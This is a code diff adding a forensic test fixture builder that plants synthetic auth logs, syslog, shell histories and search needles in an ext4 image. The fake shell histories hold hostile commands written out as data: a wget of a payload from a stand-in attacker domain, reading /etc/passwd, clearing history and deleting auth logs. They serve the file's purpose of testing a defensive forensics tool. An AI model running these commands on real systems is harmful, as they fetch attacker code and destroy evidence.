@@ -28,8 +28,10 @@ Run as a script to (re)generate every committed image (needs the mkfs tools)::
 
 from __future__ import annotations
 
+import gzip
 import hashlib
 import io
+import json
 import os
 import shutil
 import sqlite3
@@ -702,6 +704,297 @@ def build_nsrl_fixture(minimal_path: Path, metadata_path: Path) -> tuple[Path, P
 
 
 # ---------------------------------------------------------------------------
+# Phase 5 fixtures: log-parsing + super-timeline + content/unallocated search
+# ---------------------------------------------------------------------------
+#
+# A single committed, byte-deterministic ext4 image carries the WHOLE Phase-5
+# corpus so the Wave-1..3 slices have one fixture to turn green against:
+#
+#   (1) a rotated auth.log set  /var/log/auth.log, .log.1, .log.2.gz  spanning a
+#       Dec -> Jan YEAR BOUNDARY across the rotated members (LOG-01, D-45/D-46,
+#       Pitfall 4 oldest->newest ordering + year inference);
+#   (2) /var/log/syslog with service/kernel/cron/error lines (LOG-02);
+#   (3) per-user shell history: /home/alice/.bash_history (bare lines AND a
+#       `#<epoch>` HISTTIMEFORMAT pair) and /home/alice/.zsh_history (extended
+#       `: <ts>:<dur>;cmd` lines) (LOG-03, Pitfall 2);
+#   (4) an /etc/localtime SYMLINK -> /usr/share/zoneinfo/<Zone> plus an
+#       /etc/timezone text file (D-46 host-tz inference, Assumption A5);
+#   (5) a known literal string in ALLOCATED file content, a distinct known string
+#       left in UNALLOCATED space (write -> rm, blocks survive, mirroring the
+#       ext4_orphan technique), a known IOC term, and a file whose
+#       MD5/SHA-1/SHA-256 are a known-bad-hash target (SEARCH-01/02, A4);
+#   (6) two log events at the IDENTICAL second (CR-01 tied-order regression,
+#       Pitfall 3).
+#
+# Every ground-truth constant is recorded below as an importable module constant
+# AND mirrored into a committed JSON sidecar (log_search_groundtruth.json) so a
+# test can load the truth without importing the (mkfs-dependent) builder. The
+# builder is HOST-ONLY (needs mkfs.ext4/debugfs); the image is committed so CI
+# never runs mkfs (mirrors the Phase-2/4 fixture discipline). Reads at test time
+# are read-only; the builder never mutates a committed image at test time.
+
+LOG_SEARCH_NAME = "log_search_ext4.img"
+LOG_SEARCH_GROUNDTRUTH_NAME = "log_search_groundtruth.json"
+# Larger than the other ext4 fixtures: it must hold the log corpus AND leave room
+# for the deleted-but-unallocated search payload to survive in its own blocks.
+_LOG_SEARCH_SIZE = 4 * 1024 * 1024
+
+# --- (4) host timezone the image declares (D-46) ----------------------------
+# /etc/localtime is a symlink to this zoneinfo path; /etc/timezone holds the name
+# as text. The Wave-1 timeresolve must INFER this zone from the image and FLAG it.
+LOG_SEARCH_TIMEZONE = "America/New_York"
+_LOCALTIME_TARGET = f"/usr/share/zoneinfo/{LOG_SEARCH_TIMEZONE}"
+
+# --- (1)+(2) the year the RFC3164 lines resolve to (D-46 year inference) -----
+# The rotated auth set spans a Dec -> Jan boundary: the OLDEST member (auth.log.2.gz)
+# carries December lines of YEAR-1, the newer members carry January lines of YEAR.
+# Year inference seeds from file mtime/rotation order and must produce BOTH years,
+# flagged. The newest (live) auth.log mtime fixes the seed year.
+LOG_SEARCH_YEAR = 2026
+LOG_SEARCH_PREV_YEAR = LOG_SEARCH_YEAR - 1  # the Dec lines belong here
+
+# --- (5) planted search payloads (SEARCH-01/02) ------------------------------
+# An ALLOCATED file whose content contains a known literal the content scanner
+# must find by file + offset.
+LOG_SEARCH_ALLOCATED_NAME = "evidence_note.txt"
+LOG_SEARCH_ALLOCATED_NEEDLE = b"ALLOCATED-NEEDLE-7f3a2b"
+LOG_SEARCH_ALLOCATED_CONTENT = (
+    b"investigator note: nothing to see in this prefix padding region\n"
+    + LOG_SEARCH_ALLOCATED_NEEDLE
+    + b"\nand a trailing line after the planted needle\n"
+)
+
+# A DISTINCT known literal planted in UNALLOCATED space: written to a file which
+# is then deleted (debugfs rm) so its data blocks survive, carrying the needle in
+# unallocated space (mirrors the ext4_orphan technique). The unallocated scanner
+# must find it by block + absolute offset.
+LOG_SEARCH_UNALLOC_FILE = "to_be_deleted.bin"
+LOG_SEARCH_UNALLOC_NEEDLE = b"UNALLOCATED-NEEDLE-9c5d1e"
+# Pad to comfortably fill at least one 1 KiB block so the needle lands in a data
+# block (not inline), and so the block survives the unlink with content intact.
+LOG_SEARCH_UNALLOC_CONTENT = (
+    b"deleted payload header padding " * 8
+    + LOG_SEARCH_UNALLOC_NEEDLE
+    + b" deleted payload trailer padding" * 8
+)
+
+# A known IOC term that appears in BOTH a log line and allocated content, so the
+# IOC arm (SEARCH-02) reports it by file + offset. Chosen to look like an
+# indicator (a domain) without being a real one.
+LOG_SEARCH_IOC_TERM = b"evil-c2.example.invalid"
+
+# A file whose hashes are a known-BAD-hash target (SEARCH-02). Its content is a
+# fixed byte string so the hashes are byte-deterministic and independent of the
+# disk image; the search hash arm reuses the Phase-4 filter/hashsets matcher.
+LOG_SEARCH_BADHASH_NAME = "malware_sample.bin"
+LOG_SEARCH_BADHASH_CONTENT = b"a planted known-bad file for the SEARCH-02 hash arm\n"
+LOG_SEARCH_BADHASH_MD5 = hashlib.md5(LOG_SEARCH_BADHASH_CONTENT).hexdigest()
+LOG_SEARCH_BADHASH_SHA1 = hashlib.sha1(LOG_SEARCH_BADHASH_CONTENT).hexdigest()
+LOG_SEARCH_BADHASH_SHA256 = hashlib.sha256(LOG_SEARCH_BADHASH_CONTENT).hexdigest()
+
+# --- (6) CR-01 tied-second count ---------------------------------------------
+# Two syslog lines stamped at the IDENTICAL second with NULL fs meta. The
+# super-timeline must order them byte-stably across two runs (CR-01 / Pitfall 3).
+LOG_SEARCH_TIED_SECOND = "Jan 15 03:14:15"  # RFC3164 wall-clock, host-local
+LOG_SEARCH_TIED_EVENT_COUNT = 2
+
+# --- shell-history ground truth (LOG-03) -------------------------------------
+LOG_SEARCH_HISTORY_USER = "alice"
+LOG_SEARCH_BASH_EPOCH = 1736899200  # a `#<epoch>` HISTTIMEFORMAT pair in bash
+LOG_SEARCH_ZSH_EPOCH = 1736899300  # a `: <ts>:<dur>;cmd` extended-history line
+
+
+def _rfc3164(month_day_time: str, host: str, program: str, pid: int | None, msg: str) -> str:
+    """Compose one RFC3164 syslog line: ``Mmm dd HH:MM:SS host prog[pid]: msg``."""
+    tag = f"{program}[{pid}]" if pid is not None else program
+    return f"{month_day_time} {host} {tag}: {msg}\n"
+
+
+# Oldest rotated member (auth.log.2.gz): DECEMBER lines of the PREVIOUS year.
+_AUTH_LOG_2 = "".join(
+    [
+        _rfc3164("Dec 30 23:58:01", "host01", "sshd", 4011,
+                 "Failed password for invalid user oldguest from 198.51.100.7 port 2222 ssh2"),
+        _rfc3164("Dec 31 23:59:59", "host01", "sshd", 4012,
+                 "Accepted publickey for alice from 192.0.2.5 port 51000 ssh2"),
+    ]
+)
+# Middle rotated member (auth.log.1): early-JANUARY lines of the seed year.
+_AUTH_LOG_1 = "".join(
+    [
+        _rfc3164("Jan 02 08:00:00", "host01", "sshd", 5001,
+                 "Accepted password for alice from 192.0.2.5 port 51002 ssh2"),
+        _rfc3164("Jan 02 08:05:10", "host01", "sudo", None,
+                 "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update"),
+        _rfc3164("Jan 02 08:06:00", "host01", "sshd", 5002,
+                 "session opened for user alice by (uid=0)"),
+    ]
+)
+# Live auth.log: later-JANUARY lines incl. a sudo authentication FAILURE + a
+# session close + a line carrying the IOC term.
+_AUTH_LOG_LIVE = "".join(
+    [
+        _rfc3164("Jan 15 02:00:00", "host01", "sudo", None,
+                 "pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 "
+                 "euid=0 tty=/dev/pts/1 ruser=alice rhost= user=alice"),
+        _rfc3164("Jan 15 02:01:30", "host01", "sshd", 6001,
+                 "Failed password for alice from 203.0.113.9 port 40000 ssh2"),
+        _rfc3164("Jan 15 02:02:45", "host01", "sshd", 6002,
+                 f"Accepted publickey for alice from {LOG_SEARCH_IOC_TERM.decode()} port 40002 ssh2"),
+        _rfc3164("Jan 15 02:05:00", "host01", "sshd", 6001,
+                 "session closed for user alice"),
+    ]
+)
+# syslog: service/kernel/cron/error lines (LOG-02) + the two CR-01 TIED-second
+# lines (identical timestamp, distinct programs) for the tied-order regression.
+_SYSLOG = "".join(
+    [
+        _rfc3164("Jan 15 01:00:00", "host01", "systemd", 1,
+                 "Started Daily apt download activities."),
+        _rfc3164("Jan 15 01:00:05", "host01", "kernel", None,
+                 "[12345.6789] usb 1-1: new high-speed USB device number 5 using xhci_hcd"),
+        _rfc3164("Jan 15 01:30:00", "host01", "CRON", 7001,
+                 "(root) CMD (/usr/bin/backup.sh)"),
+        _rfc3164("Jan 15 02:10:00", "host01", "nginx", 8001,
+                 "error: upstream timed out connecting to evil-c2.example.invalid"),
+        # --- two TIED-second events (CR-01 / Pitfall 3) ---
+        _rfc3164(LOG_SEARCH_TIED_SECOND, "host01", "alpha", 9001, "tied event one"),
+        _rfc3164(LOG_SEARCH_TIED_SECOND, "host01", "bravo", 9002, "tied event two"),
+    ]
+)
+# bash history: bare commands AND one `#<epoch>` HISTTIMEFORMAT pair (LOG-03).
+_BASH_HISTORY = (
+    "ls -la\n"
+    "cat /etc/passwd\n"
+    f"#{LOG_SEARCH_BASH_EPOCH}\n"
+    "wget http://evil-c2.example.invalid/payload.sh\n"
+    "history -c\n"  # the tamperability tell — history was cleared
+)
+# zsh extended history: `: <start>:<elapsed>;<command>` lines (LOG-03).
+_ZSH_HISTORY = (
+    f": {LOG_SEARCH_ZSH_EPOCH}:0;whoami\n"
+    f": {LOG_SEARCH_ZSH_EPOCH + 5}:2;sudo rm -rf /var/log/auth.log\n"
+)
+LOG_SEARCH_ETC_TIMEZONE_CONTENT = (LOG_SEARCH_TIMEZONE + "\n").encode()
+
+
+def _groundtruth_dict() -> dict[str, object]:
+    """Return the committed ground-truth sidecar payload (importable + on disk)."""
+    return {
+        "image": LOG_SEARCH_NAME,
+        "timezone": LOG_SEARCH_TIMEZONE,
+        "localtime_target": _LOCALTIME_TARGET,
+        "year": LOG_SEARCH_YEAR,
+        "prev_year": LOG_SEARCH_PREV_YEAR,
+        "auth_log_members_oldest_to_newest": [
+            "/var/log/auth.log.2.gz",
+            "/var/log/auth.log.1",
+            "/var/log/auth.log",
+        ],
+        "syslog_path": "/var/log/syslog",
+        "bash_history_path": f"/home/{LOG_SEARCH_HISTORY_USER}/.bash_history",
+        "zsh_history_path": f"/home/{LOG_SEARCH_HISTORY_USER}/.zsh_history",
+        "bash_epoch": LOG_SEARCH_BASH_EPOCH,
+        "zsh_epoch": LOG_SEARCH_ZSH_EPOCH,
+        "allocated_search": {
+            "path": f"/{LOG_SEARCH_ALLOCATED_NAME}",
+            "needle": LOG_SEARCH_ALLOCATED_NEEDLE.decode(),
+            "needle_offset": LOG_SEARCH_ALLOCATED_CONTENT.index(LOG_SEARCH_ALLOCATED_NEEDLE),
+        },
+        "unallocated_search": {
+            "needle": LOG_SEARCH_UNALLOC_NEEDLE.decode(),
+            "needle_offset_in_payload": LOG_SEARCH_UNALLOC_CONTENT.index(
+                LOG_SEARCH_UNALLOC_NEEDLE
+            ),
+        },
+        "ioc_term": LOG_SEARCH_IOC_TERM.decode(),
+        "known_bad_hash": {
+            "path": f"/{LOG_SEARCH_BADHASH_NAME}",
+            "md5": LOG_SEARCH_BADHASH_MD5,
+            "sha1": LOG_SEARCH_BADHASH_SHA1,
+            "sha256": LOG_SEARCH_BADHASH_SHA256,
+        },
+        "tied_event_count": LOG_SEARCH_TIED_EVENT_COUNT,
+        "tied_second": LOG_SEARCH_TIED_SECOND,
+    }
+
+
+def build_log_search_image(dest: Path) -> Path:
+    """Build the committed Phase-5 log/search ext4 fixture (host-only, deterministic).
+
+    Reuses the pinned-UUID + frozen-clock ext4 idiom (:func:`_mke2fs_ext4` +
+    :func:`_run_debugfs`) so a rebuild is byte-identical. Plants the six corpora
+    documented above via a single ``debugfs`` request script: directories,
+    regular files (auth/syslog/history/search payloads), the gzip-compressed
+    oldest auth member, the ``/etc/localtime`` symlink + ``/etc/timezone`` text,
+    and a write-then-``rm`` file whose data blocks survive in UNALLOCATED space.
+
+    The image is committed; CI never runs ``mkfs``/``debugfs`` (Phase-2/4
+    discipline). All test-time access is read-only.
+    """
+    debugfs = _require_tool("debugfs")
+    _truncate(dest, _LOG_SEARCH_SIZE)
+    _mke2fs_ext4(dest)
+    with tempfile.TemporaryDirectory() as td:
+        tdp = Path(td)
+
+        # Materialise each planted file on the host, gzip the oldest auth member.
+        (tdp / "auth.log").write_bytes(_AUTH_LOG_LIVE.encode())
+        (tdp / "auth.log.1").write_bytes(_AUTH_LOG_1.encode())
+        # Deterministic gzip: fixed mtime=0 so the .gz bytes are reproducible.
+        gz_path = tdp / "auth.log.2.gz"
+        with gzip.GzipFile(
+            filename="", mode="wb", fileobj=open(gz_path, "wb"), mtime=0
+        ) as gz:
+            gz.write(_AUTH_LOG_2.encode())
+        (tdp / "syslog").write_bytes(_SYSLOG.encode())
+        (tdp / "bash_history").write_bytes(_BASH_HISTORY.encode())
+        (tdp / "zsh_history").write_bytes(_ZSH_HISTORY.encode())
+        (tdp / "timezone").write_bytes(LOG_SEARCH_ETC_TIMEZONE_CONTENT)
+        (tdp / "allocated.bin").write_bytes(LOG_SEARCH_ALLOCATED_CONTENT)
+        (tdp / "badhash.bin").write_bytes(LOG_SEARCH_BADHASH_CONTENT)
+        (tdp / "unalloc.bin").write_bytes(LOG_SEARCH_UNALLOC_CONTENT)
+
+        u = LOG_SEARCH_HISTORY_USER
+        script = (
+            # directory tree
+            "mkdir /var\n"
+            "mkdir /var/log\n"
+            "mkdir /home\n"
+            f"mkdir /home/{u}\n"
+            "mkdir /etc\n"
+            # (1) rotated auth set
+            f"write {tdp / 'auth.log'} /var/log/auth.log\n"
+            f"write {tdp / 'auth.log.1'} /var/log/auth.log.1\n"
+            f"write {gz_path} /var/log/auth.log.2.gz\n"
+            # (2) syslog
+            f"write {tdp / 'syslog'} /var/log/syslog\n"
+            # (3) shell history
+            f"write {tdp / 'bash_history'} /home/{u}/.bash_history\n"
+            f"write {tdp / 'zsh_history'} /home/{u}/.zsh_history\n"
+            # (4) /etc/localtime symlink + /etc/timezone text
+            f"symlink /etc/localtime {_LOCALTIME_TARGET}\n"
+            f"write {tdp / 'timezone'} /etc/timezone\n"
+            # (5a) allocated search payload + known-bad-hash file
+            f"write {tdp / 'allocated.bin'} /{LOG_SEARCH_ALLOCATED_NAME}\n"
+            f"write {tdp / 'badhash.bin'} /{LOG_SEARCH_BADHASH_NAME}\n"
+            # (5b) write-then-rm so blocks survive in UNALLOCATED space
+            f"write {tdp / 'unalloc.bin'} /{LOG_SEARCH_UNALLOC_FILE}\n"
+            f"rm /{LOG_SEARCH_UNALLOC_FILE}\n"
+            "close\n"
+        )
+        _run_debugfs(debugfs, dest, script)
+
+    # Write the committed ground-truth sidecar next to the image.
+    sidecar = dest.parent / LOG_SEARCH_GROUNDTRUTH_NAME
+    sidecar.write_text(
+        json.dumps(_groundtruth_dict(), indent=2, sort_keys=True) + "\n",
+        encoding="utf-8",
+    )
+    return dest
+
+
+# ---------------------------------------------------------------------------
 # Malicious-archive builders (consumed by the safe_extract jail tests, plan 01-03)
 # ---------------------------------------------------------------------------
 
@@ -790,6 +1083,8 @@ def main() -> None:
         (EXT4_ORPHAN_NAME, build_ext4_orphan_image),
         (EXT4_OVERWRITTEN_NAME, build_ext4_overwritten_image),
         (NTFS_RESIDENT_NAME, build_ntfs_resident_deleted_image),
+        # Phase 5 log/search fixture (also writes its ground-truth sidecar).
+        (LOG_SEARCH_NAME, build_log_search_image),
     )
     for name, build in builders:
         out = build(here / name)
